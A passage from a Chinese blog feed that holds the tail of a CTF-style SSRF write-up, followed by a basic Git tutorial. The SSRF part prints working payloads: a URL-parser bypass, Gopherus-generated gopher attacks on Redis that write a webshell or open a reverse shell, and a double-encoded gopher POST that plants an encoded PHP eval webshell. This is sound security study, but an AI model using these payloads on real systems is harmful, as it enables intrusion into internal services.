为</p><p><code>http://ip/challenge.php?url=http://@127.0.0.1:80%20@www.baidu.com/flag.php</code></p><p>有关 URL 的解析问题更加详细可参考：</p><p><a class="link" href="https://blog.csdn.net/qq_38154820/article/details/109252839">https://blog.csdn.net/qq_38154820/article/details/109252839 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="gopher攻击redis"><a class="markdownIt-Anchor" href="#gopher攻击redis">#</a> Gopher 攻击 Redis</h3><h4 id="redis的协议数据流格式"><a class="markdownIt-Anchor" href="#redis的协议数据流格式">#</a> redis 的协议数据流格式</h4><p>数据流格式中 CR LF 表示的就是 \r \n</p><blockquote><p>*&lt;参数数量&gt; CR LF<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mtext>参数</mtext><mn>1</mn><mtext>的字节数量</mtext><mo>&gt;</mo><mi>C</mi><mi>R</mi><mi>L</mi><mi>F</mi><mo>&lt;</mo><mtext>参数</mtext><mn>1</mn><mtext>的数据</mtext><mo>&gt;</mo><mi>C</mi><mi>R</mi><mi>L</mi><mi>F</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">&lt;参数 1 的字节数量&gt; CR LF&lt;参数 1 的数据&gt; CR LF...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">节</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">量</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>&lt;参数 N 的字节数量&gt; CR LF<br> &lt;参数 N 的数据&gt; CR LF<br> 简单示例：</p></blockquote><p>*4：表示 4 个参数 config、set、dir、/var/www/html<br>$6：表示每个参数的字节长度 config 长度为 6</p><blockquote><p>*4<br>$6<br>config<br>$3<br>set<br>$3<br>dir<br>$13<br>/var/www/html</p></blockquote><p>Redis 一般都是绑定在 6379 端口，如果没有设置口令（默认是无），攻击者就可以通过 SSRF 漏洞未授权访问内网 Redis，一般用来写入 Crontab 定时任务用来反弹 shell，或者写入 webshell 等等。</p><p>在 CTF 题目中如果找到了内网的服务开了 6379 端口，一般来说就是 Redis 未授权访问漏洞，并且没有 ban 掉 gopher://，可以用网上的脚本一把梭，比如：Gopherus</p><h4 id="写入shell"><a class="markdownIt-Anchor" href="#写入shell">#</a> 写入 shell</h4><p><code>python2 gopherus.py --exploit redis</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/N2EnplomH1vFh8I.png" alt="image.png"></p><p>在有 SSRF 漏洞的地方输入生成的 payload— 即 gopher://127.0.0.1:6379 后面一大段，接下来会在目录下生成 shell.php。</p><p>要注意的是如果是在 html 的输入框中直接输入提交就行，但要在浏览器的 URL 输入的话，一定要记得 URL 编码一次。</p><h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell">#</a> 反弹 shell</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/wsnqCkpzOIoucZr.png" alt="image.png"></p><p>要配合 nc 监听</p><h3 id="攻击mysql"><a class="markdownIt-Anchor" href="#攻击mysql">#</a> 攻击 Mysql</h3><p>攻击内网 mysql 的条件：内网开启了 3306 端口，mysql 无密码</p><p>上面的题目复现就用到了这个</p><h3 id="gopher发送请求"><a class="markdownIt-Anchor" href="#gopher发送请求">#</a> Gopher 发送请求</h3><p>SSRF 漏洞是服务端请求伪造攻击，不论是 GET 或者是 POST 方法，都是为了达到一个目的，就是让服务端帮我们来执行请求。</p><p>那么在 CTF 中什么情况需要利用到这种方法呢，比如发现了一个内网的应用有上传的功能，我们需要通过 POST 提交数据，而且 Gopher 协议没有被 ban，我们就可以考虑构造一个请求去打内网，下面先从本地看看如何构造：</p><p>通常，我们可以利用 gopher:// 协议可以用来发送 Get 和 Post 请求，需要注意的点是要对发送的请求头中的空格和一些特殊字符进行 url 编码，如果是在 URL 中提交 payload 的时侯要再进行一次 url 编码，先来看看如何发送简单的请求。</p><ul><li>POST 请求</li></ul><p>在 phpstudy 写入 1.php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>burpsuite 抓包获取请求头，POST 包的请求头有很多行，我们用的时候不用全部带上，但是要记得加上 Content-Type 和 Content-Length，也可以全部带上</p><blockquote><p>POST /1.php HTTP/1.1<br>Host: 192.168.0.102<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 7</p><p>a=world</p></blockquote><p>然后需要对空格和一些特殊字符进行 url 编码，注意把其中的换行的地方加上 %0D%0A，当然手动加肯定是太麻烦了，这里给出一个脚本。</p><p>一键编码脚本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /1.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.102</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 7</span></span><br><span class="line"><span class="string">a=world</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><p>在里面加上你的请求体运行，然后我们在输出结果前面手动加上 gopher 协议头和 IP: 端口，最终为：</p><p><code>gopher://192.168.0.102:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.0.102%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%207%0D%0A%0D%0Aa%3Dworld%0D%0A</code></p><p>然后用 curl 命令发出我们的请求，可以看到成功获取响应包了。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/lV8z5cASXZLnbNh.png" alt="image.png"></p><p>需要注意的是，如果要在 url 传入的话需要将发送的 POST 后面一大串再 url 编码一次</p><ul><li>GET 请求：</li></ul><p>GET 请求发送和 POST 请求基本一样</p><p>相关例题：2020 强网杯 half_infiltration</p><p>通过前面一系列操作获得 ssrf.php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;we_have_done_ssrf_here_could_you_help_to_continue_it&#x27;</span>] ?? <span class="literal">false</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|var|apache|conf|proc|log/i&quot;</span> ,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123; </span><br><span class="line">            <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">     &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div><p>跑端口 40000 跑出来个登录框，然后有上传功能，参数 file 和 content 是上传文件</p><p>于是用 gopher 协议发送一个 POST 请求写马，payload 如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: PHPSESSID=bv2afbkkbbpgkio8tjmai40ob7</span><br><span class="line">Content-Length: 174</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">file=php://filter/%2577rite=string.rot13|convert.Base64-decode|convert.iconv.utf-7.utf-8/resource=1.php&amp;content=K0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ</span><br></pre></td></tr></table></figure></div><p>最后 payload 如下，传入参数需要注意二次 url 编码：</p><p><code>http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%2520/index.php%2520HTTP/1.1%250AHost%253A%2520127.0.0.1%250ACookie%253A%2520PHPSESSID%253Dbv2afbkkbbpgkio8tjmai40ob7%250AContent-Length%253A%2520174%250AContent-Type%253A%2520application/x-www-form-urlencoded%250AConnection%253A%2520close%250d%250A%250Afile%253Dphp%253A//filter/%25252577rite%253Dstring.rot13%257Cconvert.Base64-decode%257Cconvert.iconv.utf-7.utf-8/resource%253D1.php%2526content%253DK0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ssrf&quot;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;h2 id=&quot;dasctf-x-gfctf-2024-easysignin&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Git&amp;Docker</title>
    <link href="http://example.com/2024/04/16/Git-Docker/"/>
    <id>http://example.com/2024/04/16/Git-Docker/</id>
    <published>2024-04-16T01:58:59.000Z</published>
    <updated>2024-04-17T04:30:39.200Z</updated>
    
    <content type="html"><![CDATA[<h1 id="git"><a class="markdownIt-Anchor" href="#git">#</a> Git</h1><h2 id="版本控制"><a class="markdownIt-Anchor" href="#版本控制">#</a> 版本控制</h2><h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h3><h4 id="1什么是版本控制"><a class="markdownIt-Anchor" href="#1什么是版本控制">#</a> 1. 什么是版本控制</h4><p>​版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。简单来说就是用于管理多人协同开发项目的技术。 <strong>版本迭代</strong></p><h4 id="2为什么要有版本控制"><a class="markdownIt-Anchor" href="#2为什么要有版本控制">#</a> 2. 为什么要有版本控制？</h4><p>​    没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具。（多人开发就必须要使用版本控制）<br>​    使用版本控制之后可以给你带来的一些便利：</p><blockquote><p>● 实现跨区域多人协同开发<br>● 追踪和记载一个或者多个文件的历史记录<br>● 组织和保护你的源代码和文档<br>● 统计工作量<br>● 并行开发、提高开发效率<br>● 跟踪记录整个软件的开发过程<br>● 减轻开发人员的负担，节省时间，同时降低人为错误</p></blockquote><h4 id="3常见版本控制工具"><a class="markdownIt-Anchor" href="#3常见版本控制工具">#</a> 3. 常见版本控制工具</h4><p>主流的版本控制器有如下这些：</p><blockquote><p>● <strong>Git</strong><br>● SVN（Subversion）<br>● CVS（Concurrent Versions System）<br>● VSS（Micorosoft Visual SourceSafe）<br>● TFS（Team Foundation Server）<br>● Visual Studio Online</p></blockquote><p>版本控制产品非常的多（Perforce、Rational ClearCase、RCS（GNU Revision Control System）、Serena Dimention、SVK、BitKeeper、Monotone、Bazaar、Mercurial、SourceGear Vault），现在影响力最大且使用最广泛的是 Git 与 SVN</p><h3 id="分类"><a class="markdownIt-Anchor" href="#分类">#</a> 分类</h3><h4 id="1本地版本控制"><a class="markdownIt-Anchor" href="#1本地版本控制">#</a> 1. 本地版本控制</h4><p>记录文件每次的更新，可以对每个版本做一个快照，或是记录补丁文件，适合个人用，如 RCS。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/7OWankz9bgmRxvZ.png" alt="image.png"></p><h4 id="2集中式版本控制-svn"><a class="markdownIt-Anchor" href="#2集中式版本控制-svn">#</a> 2. 集中式版本控制 （SVN）</h4><p>所有的版本数据都保存在服务器上，协同开发者从服务器上同步更新或上传自己的修改。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/EvP4MYdpjqthKH1.png" alt="image.png"></p><p>所有的版本数据都存在服务器上，用户的本地只有自己以前所同步的版本，如果不连网的话，用户就看不到历史版本，也无法切换版本验证问题，或在不同分支工作。而且，所有数据都保存在单一的服务器上，有很大的风险这个服务器会损坏，这样就会丢失所有的数据，当然可以定期备份。代表产品：SVN、CVS、VSS。</p><h4 id="3分布式版本控制-git"><a class="markdownIt-Anchor" href="#3分布式版本控制-git">#</a> 3. 分布式版本控制 （Git）</h4><p>每个人都有全部代码，所以有一定风险</p><p>所有版本信息仓库全部同步到本地的每个用户，这样就可以在本地查看所有版本历史，可以离线在本地提交，只需在连网时 push 到相应的服务器或其他用户那里。由于每个用户那里保存的都是所有的版本数据，只要有一个用户的设备没有问题就可以恢复所有的数据，但这增加了本地存储空间的占用。</p><p>不会因为服务器损坏或者网络问题造成不能工作的情况</p><h3 id="git和svn的区别"><a class="markdownIt-Anchor" href="#git和svn的区别">#</a> Git 和 SVN 的区别</h3><p>​SVN 是<strong>集中式版本控制系统</strong>，版本库是集中放在<strong>中央服务器</strong>的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是<strong>必须联网</strong>才能工作，对网络带宽要求较高。<br>​       Git 是<strong>分布式版本控制系统</strong>，<strong>没有中央服务器</strong>，每个人的电脑就是一个完整的版本库，工作的时候<strong>不需要联网</strong>了，因为版本都在自己电脑上。协同的方法是这样的：比如说自己在电脑上改了文件 A，其他人也在电脑上改了文件 A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。Git 可以直接看到更新了哪些代码和文件！</p><p><strong>Git 是目前世界上最先进的分布式版本控制系统。</strong></p><h2 id="git理论"><a class="markdownIt-Anchor" href="#git理论">#</a> Git 理论</h2><h3 id="工作区域"><a class="markdownIt-Anchor" href="#工作区域">#</a> 工作区域</h3><blockquote><ul><li>** 工作区（workspace）：** 就是你在电脑里能看到的目录。</li><li>** 暂存区（index）：** 英文叫 stage 或 index。一般存放在 <strong>.git</strong> 目录下的 index 文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。</li><li>** 版本库（Repository）：** 工作区有一个隐藏目录 <strong>.git</strong>，这个不算工作区，而是 Git 的版本库。</li><li><strong>远程 Git 仓库（Remote)</strong></li></ul></blockquote><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/4wdCj32AFk1QaiZ.png" alt="image.png"></p><h3 id="工作流程"><a class="markdownIt-Anchor" href="#工作流程">#</a> 工作流程</h3><blockquote><p>1. 在本地目录添加、修改文件</p><p>2. 将需要进行版本管理的文件添加至暂存区  //git add .</p><p>3. 将暂存区文件提交到 Git 仓库  //git commit</p><p>4. 将本地仓库文件提交到远程仓库  //git push</p></blockquote><p>git 管理的文件有三种状态：已修改（modified）、已暂存（staged）、已提交（committed）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/tga7QNjrkfeCIOn.png" alt="image.png"></p><h4 id="本地项目搭建"><a class="markdownIt-Anchor" href="#本地项目搭建">#</a> 本地项目搭建</h4><p>1. 创建一个全新仓库</p><p>初始化：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></div><p>2. 克隆远程仓库</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone [url] //https://github.com/Fc04dB/Fc04dB.github.io/tree/main/2024/04</span><br></pre></td></tr></table></figure></div><h3 id="git文件操作"><a class="markdownIt-Anchor" href="#git文件操作">#</a> Git 文件操作</h3><h4 id="文件状态"><a class="markdownIt-Anchor" href="#文件状态">#</a> 文件状态</h4><p>版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p><ul><li>Untracked: 未跟踪，此文件在文件夹中，但并没有加入到 git 库，不参与版本控制。通过 git add 状态变为 Staged.</li><li>Unmodify: 文件已经入库，未修改，即版本库中的文件快照内容与文件夹中完全一致。这种类型的文件有两种去处，如果它被修改，而变为 Modified. 如果使用 git rm 移出版本库，则成为 Untracked 文件</li><li>Modified: 文件已修改，仅仅是修改，并没有进行其他的操作。这个文件也有两个去处，通过 git add 可进入暂存 staged 状态，使用 git checkout 则丢弃修改过，返回到 unmodify 状态，这个 git checkout 即从库中取出文件，覆盖当前修改！</li><li>Staged: 暂存状态。执行 git commit 则将修改同步到库中，这时库中的文件和本地文件又变为一致，文件为 Unmodify 状态。执行 git reset HEAD filename 取消暂存，文件状态为 Modified</li></ul><h4 id="查看文件状态"><a class="markdownIt-Anchor" href="#查看文件状态">#</a> 查看文件状态</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看指定文件状态</span><br><span class="line">git status [filename]</span><br><span class="line"></span><br><span class="line">#查看所有文件状态</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"># git add .                  添加所有文件到暂存区</span><br><span class="line"># git commit -m &quot;消息内容&quot;    提交暂存区中的内容到本地仓库 -m 提交信息</span><br></pre></td></tr></table></figure></div><h4 id="忽略文件"><a class="markdownIt-Anchor" href="#忽略文件">#</a> 忽略文件</h4><p>有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等</p><p>在主目录下建立 &quot;.gitignore&quot; 文件，此文件有如下规则：</p><ol><li>忽略文件中的空行或以井号（#）开始的行将会被忽略。</li><li>可以使用 Linux 通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等。</li><li>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</li><li>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。</li><li>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</li></ol><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#为注释</span><br><span class="line">*.txt        #忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span><br><span class="line">!lib.txt     #但lib.txt除外</span><br><span class="line">/temp        #仅忽略项目根目录下的TODO文件,不包括其它目录temp</span><br><span class="line">build/       #忽略build/目录下的所有文件</span><br><span class="line">doc/*.txt    #会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</span><br></pre></td></tr></table></figure></div><h2 id="git命令"><a class="markdownIt-Anchor" href="#git命令">#</a> Git 命令</h2><p>仓库：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">$ git clone [url]</span><br></pre></td></tr></table></figure></div><p>配置：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 显示当前的Git配置</span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"># 编辑Git配置文件</span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"># 设置提交代码时的用户信息</span><br><span class="line">$ git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">$ git config [--global] user.email &quot;[email address]&quot;</span><br></pre></td></tr></table></figure></div><p>增加 / 删除文件：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 添加指定文件到暂存区</span><br><span class="line">$ git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 添加指定目录到暂存区，包括子目录</span><br><span class="line">$ git add [dir]</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"># 添加每个变化前，都会要求确认</span><br><span class="line"># 对于同一个文件的多处变化，可以实现分次提交</span><br><span class="line">$ git add -p</span><br><span class="line"></span><br><span class="line"># 删除工作区文件，并且将这次删除放入暂存区</span><br><span class="line">$ git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">$ git rm --cached [file]</span><br><span class="line"></span><br><span class="line"># 改名文件，并且将这个改名放入暂存区</span><br><span class="line">$ git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure></div><p>代码提交：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到仓库区</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure></div><p>更多指令和插件下载 &lt;<a class="link" href="https://gitee.com/all-about-git">Git 大全 - Gitee.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><blockquote><p>标签</p><p>查看信息</p><p>远程同步</p><p>撤销</p></blockquote><h2 id="git分支"><a class="markdownIt-Anchor" href="#git分支">#</a> Git 分支</h2><p><img lazyload src="/images/loading.svg" data-src="C:/Users/20957/AppData/Roaming/Typora/typora-user-images/image-20240416113826761.png" alt="image-20240416113826761"></p><p>我曾在搭建这个博客时遇到了关于分支的很大的问题，github 更改过一次分支，将 master 改为了 main，但是我本地依旧是 master，就需要更改分支</p><h3 id="分支的指令"><a class="markdownIt-Anchor" href="#分支的指令">#</a> 分支的指令</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 列出所有远程分支</span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 删除分支</span><br><span 